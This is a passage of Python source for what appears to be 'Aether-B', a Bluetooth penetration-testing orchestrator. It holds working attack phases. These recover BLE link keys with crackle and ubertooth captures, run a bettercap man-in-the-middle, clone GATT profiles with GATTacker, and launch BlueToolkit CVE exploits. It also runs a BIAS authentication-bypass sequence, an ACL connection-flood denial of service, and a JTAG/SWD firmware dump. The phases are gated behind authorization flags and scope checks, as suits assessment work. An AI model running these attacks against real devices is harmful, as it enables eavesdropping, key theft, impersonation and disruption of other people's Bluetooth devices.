        pcap_sources = list((project_dir / "passive_recon").glob("*.pcap")) + \
                       list(key_dir.glob("*.pcap"))

        for pcap_file in pcap_sources:
            if not pcap_file.exists() or pcap_file.stat().st_size == 0:
                continue
            crackle_out_file = key_dir / f"crackle_{pcap_file.stem}.txt"
            ltk_file = key_dir / f"ltk_{pcap_file.stem}.bin"
            _log(f"[2] crackle: analysing {pcap_file.name} for LTK...")
            _status(phase_id, "running", f"crackle {pcap_file.name}")

            cmd = [crackle_bin, "-i", str(pcap_file), "-o", str(ltk_file)]
            out, rc = _run(cmd, timeout=120)
            crackle_out_file.write_text(out, encoding="utf-8")
            _log(out[:3000])

            # crackle outputs "LTK: AABBCCDDEEFF..." or "Recovered LTK: ..."
            ltk_m = re.search(r'(?:LTK|Recovered LTK)[:\s]+([0-9A-Fa-f]{32,})', out, re.I)
            just_works_m = re.search(r'TK is 0+\b|just works|TK.*=.*0{16,}', out, re.I)

            if ltk_m:
                ltk_hex = ltk_m.group(1).upper()
                _log(f"  [+] LTK recovered: {ltk_hex[:16]}...")
                recovered_keys.append({"pcap": str(pcap_file), "ltk": ltk_hex, "method": "crackle"})
                _finding(
                    "AETHB-004",
                    output_file=str(ltk_file),
                    data={
                        "pcap_file": str(pcap_file),
                        "ltk_prefix": ltk_hex[:16] + "...",
                        "method": "crackle LTK recovery from legacy BLE pairing",
                    },
                )
            elif just_works_m:
                _log(f"  [+] Just Works pairing detected in {pcap_file.name} (TK=0)")
                _finding(
                    "AETHB-012",
                    output_file=str(crackle_out_file),
                    data={
                        "pcap_file": str(pcap_file),
                        "pairing_mode": "Just Works",
                        "tk": "0" * 32,
                        "note": "TK=0 confirms Just Works — LTK can be derived offline",
                    },
                )
            elif rc != 0 and "no pairing" not in out.lower():
                _log(f"  [~] crackle: no pairing exchange found in {pcap_file.name}")

    # ── Strategy B: ubertooth-btle targeted capture ────────────────────────
    if ubertooth_btle_bin and targets:
        for bdaddr in targets[:3]:  # limit to first 3 targets for time budget
            if not _in_scope_bdaddr(bdaddr):
                continue
            bdaddr_safe = bdaddr.replace(":", "_")
            cap_file = key_dir / f"ubertooth_btle_{bdaddr_safe}.pcap"
            cap_secs = min(timeout // max(len(targets), 1), 120)
            _log(f"[2] ubertooth-btle: capturing BLE pairing frames for {bdaddr} ({cap_secs}s)...")
            _status(phase_id, "running", f"ubertooth-btle capture {bdaddr}")

            # ubertooth-btle -t <target> -r <pcap> -U <device>
            cmd = [
                ubertooth_btle_bin,
                "-t", bdaddr,
                "-r", str(cap_file),
                "-U", "0",   # first ubertooth device
            ]
            proc = None
            try:
                proc = _popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(cap_secs)
            except Exception as exc:
                _err(f"ubertooth-btle error for {bdaddr}: {exc}")
            finally:
                if proc is not None:
                    _kill_proc(proc)

            if cap_file.exists() and cap_file.stat().st_size > 0:
                _log(f"  [+] BLE capture: {cap_file} ({cap_file.stat().st_size} bytes)")
                # Run crackle against newly captured file
                if crackle_bin:
                    ltk_file = key_dir / f"ltk_{bdaddr_safe}.bin"
                    crackle_out = key_dir / f"crackle_{bdaddr_safe}.txt"
                    crackle_cmd = [crackle_bin, "-i", str(cap_file), "-o", str(ltk_file)]
                    c_out, c_rc = _run(crackle_cmd, timeout=60)
                    crackle_out.write_text(c_out, encoding="utf-8")
                    ltk_m = re.search(r'(?:LTK|Recovered LTK)[:\s]+([0-9A-Fa-f]{32,})', c_out, re.I)
                    if ltk_m:
                        ltk_hex = ltk_m.group(1).upper()
                        _log(f"  [+] LTK recovered for {bdaddr}: {ltk_hex[:16]}...")
                        recovered_keys.append({"bdaddr": bdaddr, "ltk": ltk_hex, "method": "ubertooth+crackle"})
                        _finding(
                            "AETHB-004",
                            output_file=str(ltk_file),
                            data={
                                "bdaddr": bdaddr,
                                "ltk_prefix": ltk_hex[:16] + "...",
                                "method": "ubertooth-btle capture + crackle",
                            },
                        )
            else:
                _log(f"  [~] ubertooth-btle: no capture data for {bdaddr}")

    # ── Strategy C: Just Works detection via hcitool pairing attempt ───────
    if hcitool_bin and cfg.get("pairing_authorized", False) and targets:
        _log("[2] Just Works detection: attempting pairing with SSP NoInputNoOutput...")
        _status(phase_id, "running", "Just Works pairing detection")

        for bdaddr in targets[:2]:
            if not _in_scope_bdaddr(bdaddr):
                continue
            _log(f"  [2c] Testing Just Works pairing with {bdaddr}...")
            # Initiate pairing — if device accepts without confirmation it uses Just Works
            # hcitool cc to create connection, then observe HCI events
            jw_out_file = key_dir / f"just_works_{bdaddr.replace(':', '_')}.txt"
            cmd = [hcitool_bin, "-i", cfg.get("hci_device", "hci0"), "cc", "--role=s", bdaddr]
            out, rc = _run(cmd, timeout=30)
            jw_out_file.write_text(out, encoding="utf-8")

            if re.search(r'Connection complete|Connected', out, re.I):
                _log(f"  [+] Connection established to {bdaddr} — checking pairing mode...")
                _finding(
                    "AETHB-012",
                    output_file=str(jw_out_file),
                    data={
                        "bdaddr": bdaddr,
                        "pairing_mode": "Just Works suspected",
                        "note": "Connection accepted without user confirmation",
                    },
                )
    elif targets and not cfg.get("pairing_authorized", False):
        _log("[~] Just Works detection: pairing_authorized=false — skipping active pairing test")
        _status("key_recovery_jw", "skipped", "pairing_authorized not set")

    # ── Strategy D: KNOB analysis via tshark on captured pcap ─────────────
    if tshark_bin:
        all_pcaps = list((project_dir / "passive_recon").glob("*.pcap")) + \
                    list(key_dir.glob("*.pcap"))
        for pcap_file in all_pcaps:
            if not pcap_file.exists() or pcap_file.stat().st_size == 0:
                continue
            _log(f"[2] KNOB analysis: scanning {pcap_file.name} for entropy reduction frames...")
            _status(phase_id, "running", f"KNOB analysis {pcap_file.name}")

            knob_out_file = key_dir / f"knob_analysis_{pcap_file.stem}.txt"
            # Look for LMP encryption key size request frames (type 11 = LMP_encryption_key_size_req)
            # Using tshark with bthci_evt / btlmp filters
            cmd = [
                tshark_bin,
                "-r", str(pcap_file),
                "-Y", "btlmp.opcode == 11 or btlmp.key_size < 7",
                "-T", "fields",
                "-e", "frame.number",
                "-e", "btlmp.opcode",
                "-e", "btlmp.key_size",
            ]
            out, rc = _run(cmd, timeout=60)
            knob_out_file.write_text(out, encoding="utf-8")

            # Also search for entropy reduction without tshark filter
            cmd_strings = [
                tshark_bin, "-r", str(pcap_file),
                "-Y", "bthci_evt",
                "-T", "fields",
                "-e", "frame.number",
                "-e", "bthci_evt.code",
                "-e", "bthci_evt.returnparams",
            ]
            out2, rc2 = _run(cmd_strings, timeout=60)

            knob_frames_found = out.strip()
            # If tshark found LMP key size < 7 frames, that's a KNOB indicator
            if knob_frames_found and rc == 0:
                lines = [l for l in out.splitlines() if l.strip()]
                for line in lines:
                    key_size_m = re.search(r'\t(\d+)$', line)
                    if key_size_m:
                        key_size = int(key_size_m.group(1))
                        if key_size < 7:
                            _log(f"  [+] KNOB: LMP entropy {key_size} bytes detected in {pcap_file.name}!")
                            _finding(
                                "AETHB-001",
                                output_file=str(knob_out_file),
                                data={
                                    "pcap_file": str(pcap_file),
                                    "entropy_bytes": key_size,
                                    "lmp_frame_line": line.strip(),
                                    "method": "tshark LMP key size frame analysis",
                                },
                            )
                            break

    # Persist key recovery results
    keys_json = key_dir / "recovered_keys.json"
    keys_json.write_text(json.dumps(recovered_keys, indent=2), encoding="utf-8")
    _log(f"[2] Key recovery complete — {len(recovered_keys)} key(s) recovered")
    _status(phase_id, "complete", f"{len(recovered_keys)} key(s) recovered")


# ── Phase 3: Exploitation ─────────────────────────────────────────────────────

def _phase_exploitation(cfg: dict, project_dir: Path) -> None:
    """
    Phase 3: Active exploitation (requires explicit authorisation flags in config).

    Sub-tests:
      3a — bettercap BLE MITM (injection_authorized=true)
             BLE scan and MITM module via bettercap caplet
      3b — GATTacker device cloning MITM (injection_authorized=true)
             Clone target GATT profile and proxy connections
      3c — BlueToolkit CVE testing (cve_testing_authorized=true)
             Run BlueToolkit against each in-scope target for known CVE exploits
      3d — BIAS attack sequence (injection_authorized=true)
             Attempt legacy authentication bypass with role switch injection
      3e — Bluetooth DoS ACL flooding (dos_authorized=true)
             Flood target with ACL connection requests

    All sub-tests are skipped unless explicitly authorised.
    """
    phase_id = "exploitation"
    timeout = cfg.get("timeout_per_phase", 300)
    hci = cfg.get("hci_device", "hci0")
    tools = cfg.get("tools", {})
    injection_ok     = cfg.get("injection_authorized", False)
    dos_ok           = cfg.get("dos_authorized", False)
    cve_testing_ok   = cfg.get("cve_testing_authorized", False)

    exploit_dir = project_dir / "exploitation"
    exploit_dir.mkdir(parents=True, exist_ok=True)

    bettercap_bin      = _check_tool(tools.get("bettercap", "bettercap"))
    gattacker_cmd      = _resolve_tool(cfg, "gattacker")
    bluetoolkit_cmd    = _resolve_tool(cfg, "bluetoolkit")
    hcitool_bin        = _check_tool(tools.get("hcitool", "hcitool"))
    hciconfig_bin      = _check_tool(tools.get("hciconfig", "hciconfig"))

    if not any([bettercap_bin, gattacker_cmd, bluetoolkit_cmd, hcitool_bin]):
        _log("[~] No exploitation tools found — skipping exploitation phase")
        _status(phase_id, "skipped", "exploitation tools not installed")
        return

    _status(phase_id, "running", "Exploitation phase initiated")

    targets: list[str] = list(cfg.get("target_bdaddrs", []))
    recon_json = project_dir / "passive_recon" / "discovered_devices.json"
    if recon_json.exists():
        try:
            discovered = json.loads(recon_json.read_text(encoding="utf-8"))
            for dev in discovered:
                addr = dev.get("bdaddr", "")
                if addr and _in_scope_bdaddr(addr) and addr not in targets:
                    targets.append(addr)
        except Exception:
            pass

    # ── 3a: bettercap BLE MITM ────────────────────────────────────────────
    if not injection_ok:
        _log("[3a] bettercap MITM: injection_authorized=false — skipping")
        _status("exploitation_bettercap", "skipped", "injection not authorised")
    elif not bettercap_bin:
        _log("[3a] bettercap not found — skipping BLE MITM")
        _status("exploitation_bettercap", "skipped", "bettercap not installed")
    else:
        _status("exploitation_bettercap", "running", "bettercap BLE MITM")
        bc_caplet = exploit_dir / "ble_recon.cap"
        bc_caplet.write_text(
            "ble.recon on\n"
            "events.stream on\n",
            encoding="utf-8",
        )
        bc_out_file = exploit_dir / "bettercap_ble.txt"
        bc_secs = min(timeout // 3, 120)
        _log(f"[3a] bettercap: BLE recon and MITM for {bc_secs}s...")

        cmd = [
            bettercap_bin,
            "--iface", hci,
            "--caplet", str(bc_caplet),
            "--no-colors",
        ]
        proc = None
        lines_out: list[str] = []
        try:
            proc = _popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
            )
            if proc.stdout:
                deadline = time.time() + bc_secs
                while time.time() < deadline:
                    try:
                        line = proc.stdout.readline()
                    except Exception:
                        break
                    if not line:
                        break
                    decoded = line.decode("utf-8", errors="replace").rstrip()
                    if decoded:
                        _log(decoded)
                        lines_out.append(decoded)
                        # Detect successful MITM intercept in bettercap output
                        if re.search(r'intercepted|mitm|proxying|relay', decoded, re.I):
                            _finding(
                                "AETHB-013",
                                output_file=str(bc_out_file),
                                data={
                                    "tool": "bettercap",
                                    "hci_device": hci,
                                    "evidence_line": decoded.strip(),
                                },
                            )
        except Exception as exc:
            _err(f"bettercap error: {exc}")
        finally:
            if proc is not None:
                _kill_proc(proc)
        bc_out_file.write_text("\n".join(lines_out), encoding="utf-8")
        _status("exploitation_bettercap", "complete")

    # ── 3b: GATTacker device cloning ──────────────────────────────────────
    if not injection_ok:
        _log("[3b] GATTacker: injection_authorized=false — skipping")
        _status("exploitation_gattacker", "skipped", "injection not authorised")
    elif not gattacker_cmd:
        _log("[3b] GATTacker not found at /opt/GATTacker — skipping")
        _status("exploitation_gattacker", "skipped", "GATTacker not installed")
    elif not targets:
        _log("[3b] GATTacker: no targets to clone — skipping")
        _status("exploitation_gattacker", "skipped", "no targets")
    else:
        _status("exploitation_gattacker", "running", "GATTacker GATT clone MITM")
        target = targets[0]
        ga_out_file = exploit_dir / f"gattacker_{target.replace(':', '_')}.txt"
        _log(f"[3b] GATTacker: cloning GATT profile of {target}...")

        ga_parts = gattacker_cmd.split()
        cmd = ga_parts + ["--scan", "--target", target]
        ga_secs = min(timeout // 3, 120)
        out, rc = _run(cmd, timeout=ga_secs)
        ga_out_file.write_text(out, encoding="utf-8")
        _log(out[:3000])

        if re.search(r'cloned|profile.*saved|characteristics.*written|advertising|peripheral.*started', out, re.I):
            _log(f"  [+] GATTacker: device profile cloned for {target}")
            _finding(
                "AETHB-013",
                output_file=str(ga_out_file),
                data={
                    "bdaddr": target,
                    "tool": "GATTacker",
                    "method": "GATT profile clone + proxy",
                    "rc": rc,
                },
            )
        _status("exploitation_gattacker", "complete")

    # ── 3c: BlueToolkit CVE testing ───────────────────────────────────────
    if not cve_testing_ok:
        _log("[3c] BlueToolkit: cve_testing_authorized=false — skipping")
        _status("exploitation_bluetoolkit", "skipped", "CVE testing not authorised")
    elif not bluetoolkit_cmd:
        _log("[3c] BlueToolkit not found at /opt/bluetoolkit — skipping")
        _status("exploitation_bluetoolkit", "skipped", "BlueToolkit not installed")
    elif not targets:
        _log("[3c] BlueToolkit: no targets — skipping")
        _status("exploitation_bluetoolkit", "skipped", "no targets")
    else:
        _status("exploitation_bluetoolkit", "running", "BlueToolkit CVE exploit testing")
        for bdaddr in targets[:2]:
            if not _in_scope_bdaddr(bdaddr):
                continue
            bt_out_file = exploit_dir / f"bluetoolkit_{bdaddr.replace(':', '_')}.txt"
            _log(f"[3c] BlueToolkit: CVE testing against {bdaddr}...")

            bt_parts = bluetoolkit_cmd.split()
            bt_secs = min(timeout // max(len(targets), 1), 180)
            cmd = bt_parts + ["-t", bdaddr, "--all"]
            out, rc = _run(cmd, timeout=bt_secs)
            bt_out_file.write_text(out, encoding="utf-8")
            _log(out[:4000])

            # Detect successful exploitation indicators
            if re.search(
                r'success|exploited|rce|shell|crash|segfault|vulnerable|confirmed', out, re.I
            ):
                _finding(
                    "AETHB-008",
                    output_file=str(bt_out_file),
                    data={
                        "bdaddr": bdaddr,
                        "tool": "BlueToolkit",
                        "evidence": re.findall(
                            r'(?:success|exploited|vulnerable)[^\n]+', out, re.I
                        )[:5],
                        "rc": rc,
                    },
                )
        _status("exploitation_bluetoolkit", "complete")

    # ── 3d: BIAS attack sequence ──────────────────────────────────────────
    if not injection_ok:
        _log("[3d] BIAS attack: injection_authorized=false — skipping")
        _status("exploitation_bias", "skipped", "injection not authorised")
    elif not hcitool_bin or not hciconfig_bin:
        _log("[3d] BIAS attack: hcitool/hciconfig not found — skipping")
        _status("exploitation_bias", "skipped", "hcitool or hciconfig not installed")
    elif not targets:
        _log("[3d] BIAS attack: no targets — skipping")
        _status("exploitation_bias", "skipped", "no targets")
    else:
        _status("exploitation_bias", "running", "BIAS impersonation attack sequence")
        for bdaddr in targets[:2]:
            if not _in_scope_bdaddr(bdaddr):
                continue
            bias_out_file = exploit_dir / f"bias_{bdaddr.replace(':', '_')}.txt"
            bias_log: list[str] = []
            _log(f"[3d] BIAS: initiating legacy authentication bypass against {bdaddr}...")

            # Step 1: Bring up HCI interface in appropriate role
            out1, rc1 = _run([hciconfig_bin, hci, "up"], timeout=10)
            bias_log.append(f"hciconfig up rc={rc1}: {out1.strip()}")

            # Step 2: Initiate connection with slave role (role switch to force legacy auth path)
            out2, rc2 = _run([hcitool_bin, "-i", hci, "cc", "--role=s", bdaddr], timeout=20)
            bias_log.append(f"hcitool cc rc={rc2}: {out2.strip()}")

            # Step 3: Check if connection was accepted
            out3, rc3 = _run([hcitool_bin, "-i", hci, "con"], timeout=10)
            bias_log.append(f"hcitool con rc={rc3}: {out3.strip()}")

            bias_out_file.write_text("\n".join(bias_log), encoding="utf-8")

            if re.search(r'ACL\s+' + re.escape(bdaddr), out3, re.I) or \
               re.search(r'Connection complete', out2, re.I):
                _log(f"  [+] BIAS: connection established to {bdaddr} — authentication bypass may be confirmed")
                _finding(
                    "AETHB-002",
                    output_file=str(bias_out_file),
                    data={
                        "bdaddr": bdaddr,
                        "method": "BIAS legacy authentication bypass with role switch",
                        "hci_connection_output": out3.strip()[:500],
                    },
                )
            else:
                _log(f"  [~] BIAS: connection to {bdaddr} did not succeed (device may be patched or unreachable)")
            # Disconnect
            _run([hcitool_bin, "-i", hci, "dc", bdaddr], timeout=5)
        _status("exploitation_bias", "complete")

    # ── 3e: Bluetooth DoS — ACL flooding ─────────────────────────────────
    if not dos_ok:
        _log("[3e] DoS: dos_authorized=false — skipping")
        _status("exploitation_dos", "skipped", "DoS not authorised in config")
    elif not hcitool_bin:
        _log("[3e] DoS: hcitool not found — skipping")
        _status("exploitation_dos", "skipped", "hcitool not installed")
    elif not targets:
        _log("[3e] DoS: no targets — skipping")
        _status("exploitation_dos", "skipped", "no targets")
    else:
        _status("exploitation_dos", "running", "Bluetooth DoS ACL flood test")
        dos_success = False
        for bdaddr in targets[:1]:
            if not _in_scope_bdaddr(bdaddr):
                continue
            dos_out_file = exploit_dir / f"dos_{bdaddr.replace(':', '_')}.txt"
            dos_log: list[str] = []
            _log(f"[3e] DoS: ACL connection flood against {bdaddr}...")

            dos_secs = min(timeout // 4, 60)
            deadline = time.time() + dos_secs
            attempt = 0
            while time.time() < deadline:
                out, rc = _run(
                    [hcitool_bin, "-i", hci, "cc", bdaddr],
                    timeout=5,
                )
                dos_log.append(f"attempt {attempt}: rc={rc} {out.strip()[:80]}")
                attempt += 1
                # Disconnect to free connection slot for next attempt
                _run([hcitool_bin, "-i", hci, "dc", bdaddr], timeout=3)

            dos_out_file.write_text("\n".join(dos_log), encoding="utf-8")
            _log(f"  [*] DoS: {attempt} connection attempts sent to {bdaddr}")

            # Check if device became unreachable
            check_out, check_rc = _run(
                [hcitool_bin, "-i", hci, "info", bdaddr], timeout=15
            )
            if check_rc != 0 or re.search(r'error|timeout|no route|connection refused', check_out, re.I):
                _log(f"  [+] DoS: {bdaddr} appears unresponsive after flood")
                dos_success = True
                _finding(
                    "AETHB-014",
                    output_file=str(dos_out_file),
                    data={
                        "bdaddr": bdaddr,
                        "method": "ACL connection flood",
                        "attempts": attempt,
                        "result": "device unresponsive",
                    },
                )
            else:
                _log(f"  [~] DoS: {bdaddr} remained responsive after {attempt} attempts")
        _status("exploitation_dos", "complete")

    _status(phase_id, "complete", "Exploitation phase complete")


# ── Phase 4: Firmware ─────────────────────────────────────────────────────────

def _phase_firmware(cfg: dict, project_dir: Path) -> None:
    """
    Phase 4: Bluetooth device firmware extraction and analysis.

    Requires physical_access=true in config.

    Sub-tests:
      4a — openocd: JTAG/SWD connection attempt and firmware dump
           (gated by physical_access; emits AETHB-015 on success)
      4b — binwalk: static analysis of any .bin/.hex/.elf firmware files
           found in firmware/ directory, checking for hardcoded keys,
           weak crypto patterns, and unsigned OTA upgrade references.

    Emits:
      AETHB-015 — Firmware extraction via JTAG/SWD succeeded
    """
    phase_id = "firmware"
    timeout = cfg.get("timeout_per_phase", 300)
    tools = cfg.get("tools", {})
    physical_access = cfg.get("physical_access", False)

    firmware_dir = project_dir / "firmware"
    firmware_dir.mkdir(parents=True, exist_ok=True)

    openocd_bin = _check_tool(tools.get("openocd", "openocd"))
    binwalk_bin = _check_tool(tools.get("binwalk", "binwalk"))

    if not openocd_bin and not binwalk_bin:
        _log("[~] openocd and binwalk not found — skipping firmware phase")
        _status(phase_id, "skipped", "openocd and binwalk not installed")
        return

    _status(phase_id, "running", "Firmware extraction and analysis phase")

    # ── 4a: openocd JTAG/SWD firmware dump ───────────────────────────────
    if not physical_access:
        _log("[4a] openocd: physical_access=false — skipping JTAG/SWD extraction")
        _status("firmware_openocd", "skipped", "physical access not authorised")
    elif not openocd_bin:
        _log("[4a] openocd not found — skipping firmware dump")
        _status("firmware_openocd", "skipped", "openocd not installed")
    else:
        _status("firmware_openocd", "running", "openocd JTAG/SWD Bluetooth firmware dump")
        dump_file = firmware_dir / "bt_firmware.bin"
        ocd_log   = firmware_dir / "openocd_output.txt"
        _log(f"[4a] openocd: attempting JTAG/SWD connection and flash dump to {dump_file}...")

        # Generic openocd invocation for ARM Cortex-M Bluetooth SoCs
        # Supports: Nordic nRF52 (cortex_m), TI CC26xx, Cypress CYBL, Qualcomm QSEE
        # Try nRF52840 target configuration first (most common BLE SoC)
        cmd = [
            openocd_bin,
            "-f", "interface/jlink.cfg",
            "-f", "target/nrf52.cfg",
            "-c", f"init; halt; flash read_bank 0 {dump_file} 0 0x100000; shutdown",
        ]
        out, rc = _run(cmd, timeout=min(timeout, 300))
        ocd_log.write_text(out, encoding="utf-8")
        _log(out[:3000])

        if dump_file.exists() and dump_file.stat().st_size > 0:
            _log(f"  [+] Firmware dump successful: {dump_file} ({dump_file.stat().st_size} bytes)")
            _finding(
                "AETHB-015",
                output_file=str(dump_file),
                data={
                    "method": "openocd JTAG/SWD — nRF52 target",
                    "dump_size": dump_file.stat().st_size,
                    "dump_file": str(dump_file),
                },
            )
        else:
            # Retry with a generic ARM Cortex-M target
            dump_file_arm = firmware_dir / "bt_firmware_arm.bin"
            cmd_arm = [
                openocd_bin,
                "-f", "interface/jlink.cfg",
                "-f", "target/stm32wbx.cfg",
                "-c", f"init; halt; flash read_bank 0 {dump_file_arm} 0 0x100000; shutdown",
            ]
            out_arm, rc_arm = _run(cmd_arm, timeout=min(timeout, 300))
            ocd_log.write_text(ocd_log.read_text(encoding="utf-8") + "\n--- STM32WB retry ---\n" + out_arm, encoding="utf-8")
            _log(out_arm[:2000])

            if dump_file_arm.exists() and dump_file_arm.stat().st_size > 0:
                _log(f"  [+] Firmware dump (STM32WB): {dump_file_arm} ({dump_file_arm.stat().st_size} bytes)")
                _finding(
                    "AETHB-015",
                    output_file=str(dump_file_arm),
                    data={
                        "method": "openocd JTAG/SWD — STM32WB target",
                        "dump_size": dump_file_arm.stat().st_size,
                        "dump_file": str(dump_file_arm),
                    },
                )
            else:
                _err("[4a] openocd: dump failed for both nRF52 and STM32WB targets — check debug port access and JTAG connections")

        _status("firmware_openocd", "complete" if rc == 0 else "error", f"rc={rc}")

    # ── 4b: binwalk static analysis ───────────────────────────────────────
    if not binwalk_bin:
        _log("[4b] binwalk not found — skipping static firmware analysis")
        _status("firmware_binwalk", "skipped", "binwalk not installed")
    else:
        _status("firmware_binwalk", "running", "binwalk static Bluetooth firmware analysis")

        firmware_targets: list[Path] = []
        for ext in ("*.bin", "*.hex", "*.elf", "*.fw", "*.img"):
            firmware_targets.extend(firmware_dir.glob(ext))

        if not firmware_targets:
            _log("[4b] No firmware files in firmware/ directory — place .bin/.hex/.elf files there")
            _status("firmware_binwalk", "skipped", "no firmware files to analyse")
        else:
            for fw_file in firmware_targets[:5]:
                bw_out_file    = firmware_dir / f"binwalk_{fw_file.stem}.txt"
                bw_extract_dir = firmware_dir / f"binwalk_extract_{fw_file.stem}"
                _log(f"[4b] binwalk: analysing {fw_file.name}...")

                # Entropy + signature scan
                cmd_sig = [binwalk_bin, "--signature", "--entropy", str(fw_file)]
                out_sig, _ = _run(cmd_sig, timeout=120)
                bw_out_file.write_text(out_sig, encoding="utf-8")
                _log(out_sig[:3000])

                # Extract embedded filesystems
                cmd_ext = [
                    binwalk_bin, "--extract", "--directory", str(bw_extract_dir),
                    "--quiet", str(fw_file),
                ]
                _run(cmd_ext, timeout=180)

                # Search for hardcoded key material and BLE credentials in firmware
                bt_key_pattern = re.compile(
                    r'(?:linkkey|ltk|irk|csrk|pairing_key|bt_key|ble_key)'
                    r'["\s:=]+([0-9A-Fa-f]{32,})|'
                    r'(?:passkey|pin_code)["\s:=]+(\d{4,8})',
                    re.I,
                )
                hardcoded_found = False
                search_targets = [fw_file]
                if bw_extract_dir.exists():
                    search_targets += list(bw_extract_dir.rglob("*"))

                for t in search_targets[:100]:
                    if not Path(t).is_file():
                        continue
                    try:
                        content_bytes = Path(t).read_bytes()
                        text_content = content_bytes.decode("latin-1", errors="replace")

                        # Check for Bluetooth link key patterns
                        for m in bt_key_pattern.finditer(text_content):
                            if m.group(1) or m.group(2):
                                _log(f"  [+] Hardcoded BT key material at {t}: {(m.group(1) or m.group(2))[:16]}...")
                                hardcoded_found = True
                                break

                        # Check for hardcoded PIN / passkey (4-6 digits)
                        pin_m = re.search(r'(?:default.pin|static.passkey|pin.code)[^\n]{0,20}(\d{4,6})', text_content, re.I)
                        if pin_m:
                            _log(f"  [+] Possible hardcoded PIN/passkey at {t}: {pin_m.group(1)}")
                            hardcoded_found = True

                        # Check for SMP Just Works TK = 0 (128 bits of zeros) in binary
                        zero_tk = b'\x00' * 16
                        if zero_tk in content_bytes and b'bluetooth' in content_bytes.lower():
                            _log(f"  [*] Zero TK (Just Works) constant found near Bluetooth code in {t}")

                    except Exception:
                        pass

                if hardcoded_found:
                    _finding(
                        "AETHB-004",
                        output_file=str(fw_file),
                        data={
                            "firmware_file": str(fw_file),
                            "method": "binwalk extraction + key pattern scan",
                            "note": "Hardcoded BT key material or PIN found in firmware binary",
                        },
                    )

                # Check for unsigned OTA / DFU references without signature verification
                if re.search(r'OTA|DFU|firmware.update|ota.upgrade', out_sig, re.I):
                    _log(f"  [*] OTA/DFU reference found in {fw_file.name}")
                    ota_sig_check = re.search(
                        r'ECDSA|RSA|signature.verif|verif.*signature|CRC.check|sha256', out_sig, re.I
                    )
                    if not ota_sig_check:
                        _log(f"  [+] OTA/DFU without signature verification detected in {fw_file.name}")
                        _finding(
                            "AETHB-015",
                            output_file=str(fw_file),
                            data={
                                "firmware_file": str(fw_file),
                                "method": "binwalk OTA/DFU reference without signature",
                                "ota_reference": True,
                                "signature_verification": "not detected",
                            },
                        )

        _status("firmware_binwalk", "complete")

    _log("[4] Firmware analysis phase complete")
    _status(phase_id, "complete", "Firmware analysis complete")


# ── Main orchestrator ─────────────────────────────────────────────────────────

def run(cfg: dict, project_dir: Path) -> None:
    global _scope_bdaddrs, _scope_uuids

    output_dir = project_dir / cfg.get("output_dir", "aether_b_output")
    output_dir.mkdir(parents=True, exist_ok=True)

    # Scope enforcement
    scope_cfg = cfg.get("scope", {})
    _scope_bdaddrs = {_normalise_bdaddr(a) for a in scope_cfg.get("bdaddrs", [])}
    _scope_uuids   = {u.upper() for u in scope_cfg.get("uuids", [])}
    if _scope_bdaddrs or _scope_uuids:
        _log(f"Scope: {len(_scope_bdaddrs)} BD address(es), {len(_scope_uuids)} UUID(s) whitelisted")

    _setup_signal_handlers(output_dir)

    phases_cfg = cfg.get("phases", {})
    hci = cfg.get("hci_device", "hci0")

    _log("=" * 60)
    _log("AUTHORIZED USE ONLY. Explicit written permission from the")
    _log("device owner is required before any Bluetooth assessment.")
    _log("=" * 60)
    _log(f"Aether-B Bluetooth Penetration Test Orchestrator v{VERSION}")
    _log(f"Project    : {project_dir}")
    _log(f"HCI device : {hci}")
    _log(f"Ubertooth  : {cfg.get('ubertooth_device', '/dev/ttyACM0')}")
    _log(f"Targets    : {cfg.get('target_bdaddrs', [])}")
    _log(f"Output     : {output_dir}")
    _log("=" * 60)

    # Phase 0 — Passive Recon
    if phases_cfg.get("passive_recon", True):
        _phase_passive_recon(cfg, output_dir)
    else:
        _log("[~] Phase passive_recon disabled in config — skipping")

    # Phase 1 — Enumeration
    if phases_cfg.get("enumeration", True):
        _phase_enumeration(cfg, output_dir)
    else:
        _log("[~] Phase enumeration disabled in config — skipping")

    # Phase 2 — Key Recovery
    if phases_cfg.get("key_recovery", True):
        _phase_key_recovery(cfg, output_dir)
    else:
        _log("[~] Phase key_recovery disabled in config — skipping")

    # Phase 3 — Exploitation
    if phases_cfg.get("exploitation", False):
        _phase_exploitation(cfg, output_dir)
    else:
        _log("[~] Phase exploitation disabled in config — skipping (set exploitation: true to enable)")

    # Phase 4 — Firmware
    if phases_cfg.get("firmware", False):
        _phase_firmware(cfg, output_dir)
    else:
        _log("[~] Phase firmware disabled in config — skipping (set firmware: true to enable)")

    # Persist findings and metadata
    _save_findings(output_dir)

    meta = {
        "version": VERSION,
        "project": str(project_dir),
        "hci_device": hci,
        "ubertooth_device": cfg.get("ubertooth_device", "/dev/ttyACM0"),
        "target_bdaddrs": cfg.get("target_bdaddrs", []),
        "target_uuids": cfg.get("target_uuids", []),
        "scope": scope_cfg,
        "phases_run": phases_cfg,
        "output_dir": str(output_dir),
        "completed_at": datetime.now(timezone.utc).isoformat(),
        "findings_count": len(_findings_collected),
        "injection_authorized": cfg.get("injection_authorized", False),
        "dos_authorized": cfg.get("dos_authorized", False),
        "pairing_authorized": cfg.get("pairing_authorized", False),
        "cve_testing_authorized": cfg.get("cve_testing_authorized", False),
        "physical_access": cfg.get("physical_access", False),
    }
    (output_dir / "assessment_meta.json").write_text(
        json.dumps(meta, indent=2), encoding="utf-8"
    )
    _log(f"Assessment complete — {len(_findings_collected)} finding(s) — output: {output_dir}")
    _status("complete", "complete", str(output_dir))


# ── CLI ───────────────────────────────────────────────────────────────────────

def _startup_tool_check() -> None:
    """Warn about missing Bluetooth tools at startup."""
    important = [
        "hcitool", "hciconfig", "bluetoothctl", "sdptool", "gatttool",
    ]
    optional = [
        "ubertooth-scan", "ubertooth-btle", "ubertooth-rx",
        "btscanner", "crackle", "bettercap", "binwalk", "tshark", "openocd",
    ]
    missing_important = [t for t in important if not shutil.which(t)]
    missing_optional  = [t for t in optional  if not shutil.which(t)]

    if missing_important or missing_optional:
        print("[!] Aether-B startup tool check:", file=sys.stderr)
    for t in missing_important:
        print(f"    MISSING (important): {t}  — run: sudo python3 install.py", file=sys.stderr)
    for t in missing_optional:
        print(f"    MISSING (optional) : {t}  — install manually if needed", file=sys.stderr)
    if missing_important:
        print("[!] Core BlueZ tools missing — most phases will be skipped.\n", file=sys.stderr)


def _parse_args() -> argparse.Namespace:
    _default_cfg     = str(_AETHER_B_DIR / "config.json")
    _default_project = ""

    parser = argparse.ArgumentParser(
        prog="aether-b",
        description="Aether-B — Bluetooth Penetration Test Orchestrator",
